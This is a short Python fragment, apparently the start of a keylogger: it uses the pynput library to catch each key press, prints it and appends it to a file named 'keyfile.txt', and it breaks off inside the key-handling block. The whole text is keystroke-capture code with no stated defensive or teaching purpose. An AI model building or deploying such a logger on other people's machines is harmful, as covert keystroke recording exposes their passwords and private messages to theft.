from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt",'a')as logkey:
        try:
            char=key.char    